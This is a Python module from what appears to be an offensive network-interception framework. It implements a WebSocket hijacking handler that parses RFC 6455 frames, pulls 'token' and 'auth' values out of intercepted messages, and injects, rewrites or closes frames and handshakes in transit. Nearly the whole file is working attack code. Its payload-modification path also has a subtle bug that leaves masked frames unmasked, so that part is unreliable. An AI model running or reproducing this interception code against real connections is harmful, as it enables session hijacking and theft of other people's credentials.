"""
WebSocket Hijacking Handler

Implements WebSocket protocol detection and attack capabilities:
- Upgrade handshake detection
- Frame parsing (FIN, opcode, mask, payload)
- Bidirectional message injection
- Connection hijacking

WebSocket Frame Format (RFC 6455):
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data continued ...                |
+---------------------------------------------------------------+
"""

from typing import Optional, Dict, Any
from dataclasses import dataclass
import struct
import hashlib
import base64

from modules.protocols.base_handler import ProtocolHandler, ProtocolType, ProcessingResult

@dataclass
class WSFrame:
    """WebSocket frame structure"""
    fin: bool  # Final fragment flag
    opcode: int  # Frame type
    masked: bool  # Mask flag
    payload_length: int
    masking_key: Optional[bytes]
    payload: bytes
    
    # Opcodes (RFC 6455)
    OPCODE_CONTINUATION = 0x0
    OPCODE_TEXT = 0x1
    OPCODE_BINARY = 0x2
    OPCODE_CLOSE = 0x8
    OPCODE_PING = 0x9
    OPCODE_PONG = 0xA
    
    def to_bytes(self) -> bytes:
        """Serialize frame to wire format"""
        byte1 = (0x80 if self.fin else 0) | self.opcode
        
        # Determine payload length encoding
        if self.payload_length < 126:
            byte2 = (0x80 if self.masked else 0) | self.payload_length
            length_bytes = struct.pack('!BB', byte1, byte2)
        elif self.payload_length < 65536:
            byte2 = (0x80 if self.masked else 0) | 126
            length_bytes = struct.pack('!BBH', byte1, byte2, self.payload_length)
        else:
            byte2 = (0x80 if self.masked else 0) | 127
            length_bytes = struct.pack('!BBQ', byte1, byte2, self.payload_length)
        
        # Add masking key if present
        if self.masked and self.masking_key:
            length_bytes += self.masking_key
        
        return length_bytes + self.payload


class WebSocketHijack(ProtocolHandler):
    """
    WebSocket protocol hijacking handler.
    
    Attack Capabilities:
    1. Inject messages into active connections
    2. Modify messages in transit
    3. Hijack authentication tokens
    4. Command injection for WebSocket APIs
    """
    
    WEBSOCKET_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    
    def __init__(self):
        super().__init__("WebSocket", ProtocolType.WEB)
        self.active_connections: Dict[str, Dict] = {}
    
    def detect(self, packet: bytes) -> bool:
        """
        Detect WebSocket traffic.
        
        Checks for:
        - HTTP Upgrade header
        - WebSocket frame structure
        """
        packet_str = packet.decode('utf-8', errors='ignore')
        
        # Check for WebSocket upgrade handshake
        if 'Upgrade: websocket' in packet_str or 'upgrade: websocket' in packet_str:
            return True
        
        # Check for WebSocket frame (at least 2 bytes)
        if len(packet) >= 2:
            try:
                frame = self._parse_frame(packet)
                # Valid opcode check
                if frame.opcode in [0x0, 0x1, 0x2, 0x8, 0x9, 0xA]:
                    return True
            except:
                pass
        
        return False
    
    def process(self, packet: bytes) -> ProcessingResult:
        """
        Process WebSocket packet and extract intelligence.
        
        Extracts:
        - Message content
        - Authentication tokens
        - Connection metadata
        """
        try:
            packet_str = packet.decode('utf-8', errors='ignore')
            
            # Process upgrade handshake
            if 'Upgrade: websocket' in packet_str:
                return self._process_handshake(packet_str)
            
            # Process WebSocket frame
            frame = self._parse_frame(packet)
            
            metadata = {
                'opcode': frame.opcode,
                'fin': frame.fin,
                'payload_length': frame.payload_length
            }
            
            # Extract message content
            if frame.opcode in [WSFrame.OPCODE_TEXT, WSFrame.OPCODE_BINARY]:
                message = frame.payload.decode('utf-8', errors='ignore')
                
                # Check for tokens/credentials in message
                credentials = {}
                tokens = {}
                
                if 'token' in message.lower():
                    # Attempt to extract token
                    import re
                    token_match = re.search(r'"token"\s*:\s*"([^"]+)"', message)
                    if token_match:
                        tokens['ws_token'] = token_match.group(1)
                
                if 'auth' in message.lower():
                    auth_match = re.search(r'"auth"\s*:\s*"([^"]+)"', message)
                    if auth_match:
                        credentials['ws_auth'] = auth_match.group(1)
                
                metadata['message'] = message[:200]  # First 200 chars
                
                return ProcessingResult(
                    protocol_name=self.name,
                    success=True,
                    credentials=credentials if credentials else None,
                    tokens=tokens if tokens else None,
                    metadata=metadata
                )
            
            return ProcessingResult(
                protocol_name=self.name,
                success=True,
                metadata=metadata
            )
            
        except Exception as e:
            return ProcessingResult(
                protocol_name=self.name,
                success=False,
                error=str(e)
            )
    
    def modify(self, packet: bytes, rules: Dict[str, Any]) -> Optional[bytes]:
        """
        Modify WebSocket packet according to attack rules.
        
        Supported rules:
        - inject_message: str - Inject message into stream
        - modify_payload: str - Replace message content
        - close_connection: bool - Send close frame
        """
        try:
            # If this is a handshake, potentially inject headers
            packet_str = packet.decode('utf-8', errors='ignore')
            if 'Upgrade: websocket' in packet_str:
                if 'inject_header' in rules:
                    # Add custom headers to handshake
                    lines = packet_str.split('\r\n')
                    for header, value in rules['inject_header'].items():
                        lines.insert(-2, f"{header}: {value}")
                    return '\r\n'.join(lines).encode()
                return None
            
            # Parse frame
            frame = self._parse_frame(packet)
            
            # Inject new message
            if 'inject_message' in rules:
                return self.create_text_frame(rules['inject_message'])
            
            # Modify payload
            if 'modify_payload' in rules:
                new_payload = rules['modify_payload'].encode()
                modified_frame = WSFrame(
                    fin=frame.fin,
                    opcode=frame.opcode,
                    masked=frame.masked,
                    payload_length=len(new_payload),
                    masking_key=frame.masking_key,
                    payload=new_payload
                )
                return modified_frame.to_bytes()
            
            # Close connection
            if rules.get('close_connection'):
                return self.create_close_frame()
            
            return None
            
        except Exception as e:
            print(f"[WebSocket] Modification error: {e}")
            return None
    
    def _parse_frame(self, data: bytes) -> WSFrame:
        """Parse WebSocket frame from bytes"""
        if len(data) < 2:
            raise ValueError("Insufficient data for frame header")
        
        byte1 = data[0]
        byte2 = data[1]
        
        fin = (byte1 & 0x80) != 0
        opcode = byte1 & 0x0F
        masked = (byte2 & 0x80) != 0
        payload_len = byte2 & 0x7F
        
        offset = 2
        
        # Extended payload length
        if payload_len == 126:
            payload_len = struct.unpack('!H', data[offset:offset+2])[0]
            offset += 2
        elif payload_len == 127:
            payload_len = struct.unpack('!Q', data[offset:offset+8])[0]
            offset += 8
        
        # Masking key
        masking_key = None
        if masked:
            masking_key = data[offset:offset+4]
            offset += 4
        
        # Payload
        payload = data[offset:offset+payload_len]
        
        # Unmask if needed
        if masked and masking_key:
            payload = self._unmask_payload(payload, masking_key)
        
        return WSFrame(
            fin=fin,
            opcode=opcode,
            masked=masked,
            payload_length=payload_len,
            masking_key=masking_key,
            payload=payload
        )
    
    def _unmask_payload(self, payload: bytes, mask: bytes) -> bytes:
        """Unmask WebSocket payload"""
        unmasked = bytearray()
        for i, b in enumerate(payload):
            unmasked.append(b ^ mask[i % 4])
        return bytes(unmasked)
    
    def _process_handshake(self, handshake: str) -> ProcessingResult:
        """Process WebSocket upgrade handshake"""
        metadata = {}
        
        # Extract Sec-WebSocket-Key
        import re
        key_match = re.search(r'Sec-WebSocket-Key:\s*(\S+)', handshake, re.I)
        if key_match:
            client_key = key_match.group(1)
            # Calculate accept key
            accept_key = base64.b64encode(
                hashlib.sha1((client_key + self.WEBSOCKET_GUID).encode()).digest()
            ).decode()
            metadata['client_key'] = client_key
            metadata['accept_key'] = accept_key
        
        # Extract Origin
        origin_match = re.search(r'Origin:\s*(\S+)', handshake, re.I)
        if origin_match:
            metadata['origin'] = origin_match.group(1)
        
        return ProcessingResult(
            protocol_name=self.name,
            success=True,
            metadata=metadata
        )
    
    def create_text_frame(self, message: str, masked: bool = True) -> bytes:
        """Create a text frame for injection"""
        payload = message.encode()
        
        masking_key = None
        if masked:
            import os
            masking_key = os.urandom(4)
            # Mask payload
            masked_payload = bytearray()
            for i, b in enumerate(payload):
                masked_payload.append(b ^ masking_key[i % 4])
            payload = bytes(masked_payload)
        
        frame = WSFrame(
            fin=True,
            opcode=WSFrame.OPCODE_TEXT,
            masked=masked,
            payload_length=len(payload),
            masking_key=masking_key,
            payload=payload
        )
        
        return frame.to_bytes()
    
    def create_close_frame(self) -> bytes:
        """Create a close frame"""
        frame = WSFrame(
            fin=True,
            opcode=WSFrame.OPCODE_CLOSE,
            masked=False,
            payload_length=0,
            masking_key=None,
            payload=b''
        )
        return frame.to_bytes()
